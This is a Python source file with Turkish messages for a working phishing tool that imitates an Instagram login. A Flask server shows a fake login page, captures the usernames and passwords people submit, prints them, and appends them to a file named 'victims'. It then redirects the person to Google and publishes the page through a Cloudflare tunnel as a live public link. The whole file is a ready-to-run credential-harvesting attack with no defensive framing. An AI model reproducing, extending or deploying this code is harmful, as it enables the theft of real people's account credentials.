import os
import sys
import subprocess
import logging

def setup():
    try:
        from flask import Flask, render_template, request, redirect
        from pycloudflared import try_cloudflare
    except ImportError:
        print("[!] Kutuphaneler eksik, kuruluyor...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "flask", "pycloudflared"])
        print("[+] Kurulum tamamlandi. Lutfen programi tekrar calistirin.")
        sys.exit()

setup()

from flask import Flask, render_template, request, redirect
from pycloudflared import try_cloudflare

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""
    {"="*45}
 ███████╗███████╗██████╗  ██████╗ ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ 
╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗
  ███╔╝ █████╗  ██████╔╝██║   ██║██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝
 ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗
███████╗███████╗██║  ██║╚██████╔╝██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║
╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝

    {"="*45}
    [1] Instagram
    {"-"*45}  """)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        password = request.form.get('password')
        
        print("\n" + "!"*30)
        print(f"[!] YENI VERI GELDI!")
        print(f"[*] KULLANICI: {user}")
        print(f"[*] SIFRE     : {password}")
        print("!"*30 + "\n")
        
        with open("kurbanlar.txt", "a", encoding="utf-8") as f:
            f.write(f"User: {user} | Pass: {password}\n")
            
        return redirect("https://www.google.com")
        
    return render_template('login.html')

def start_phishing():
    banner()
    secim = input("Hedef siteyi secin [1-3] > ")
    
    port = 5000
    print("\n[*] Tunel olusturuluyor...")
    
    try:
        tunnel = try_cloudflare(port)
        link = tunnel.url if hasattr(tunnel, 'url') else tunnel
        
        print(f"\n[+] CANLI LINK: {link}")
        print("[+] Bekleniyor (Veri geldiginde buraya dusecek)...\n")
        
        app.run(port=port, debug=False, use_reloader=False)
    except Exception as e:
        print(f"[-] Hata: {e}")

if __name__ == '__main__':
    start_phishing()